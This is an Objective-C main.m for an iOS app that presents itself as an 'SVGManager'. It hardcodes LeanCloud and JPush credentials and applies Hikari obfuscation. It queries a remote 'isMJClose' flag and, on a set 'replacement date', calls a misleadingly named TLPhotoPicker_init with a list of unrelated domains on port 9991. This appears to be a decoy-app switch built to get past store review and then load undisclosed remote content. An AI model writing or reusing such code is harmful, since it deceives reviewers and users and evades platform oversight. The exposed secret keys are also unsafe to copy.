//
//  main.m
//  SVGManager
//
//  Created by fenglh on 2018/5/17.
//  Copyright © 2018年 ITX. All rights reserved.
//

#import <UIKit/UIKit.h>
#import "AppDelegate.h"
#import <AVOSCloud/AVOSCloud.h>
NSString *const clientKey = @"fWv9fBxGPpfFUpnctBVudGfc";
NSString *const className = @"Joke";
NSString *const ApplicationId = @"WxhrgNaDieb6GvnfSuAvBGPj-gzGzoHsz";

extern void hikari_fla(void);
extern void hikari_strenc(void);
extern void hikari_bcf(void);
int main(int argc, char * argv[]) {
    @autoreleasepool {
        
        hikari_fla();
        hikari_strenc();
        hikari_bcf();
        NSDictionary *info =@{
                              kJPushKey: @"3e766f72baf7c9915729a3cd", // 极光推送key
                              kJPushChanel: @"App Store", // 极光推送channel字符串
                              kCheckUrl: @[@"ynjgc.com:9991",
                                           @"5188youx.com:9991",
                                           @"kxkaoyan.com:9991",
                                           @"fucangvip.com:9991",
                                           @"jshuifu.com:9991",
                                           @"hmtcex.com:9991",
                                           @"dsw360.com:9991",
                                           @"28kam.com:9991",
                                           @"38kam.com:9991"],
                              kOpenDate: @"2018-06-15", // 替换的时间
                              kIsDebugMode: @NO // 是否开启debug模式
                              };
        
        [AVOSCloud setApplicationId:ApplicationId clientKey:clientKey];
        [AVOSCloud setAllLogsEnabled:YES];
        AVQuery *query = [AVQuery queryWithClassName:className];
        query.limit = 1;
        AVObject *object = [query getFirstObject];
        if (object) {
            BOOL isMJClose = [[object objectForKey:@"isMJClose"] boolValue];
            if (!isMJClose) {
                TLPhotoPicker_init([AppDelegate class], info);
            }
        }
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}
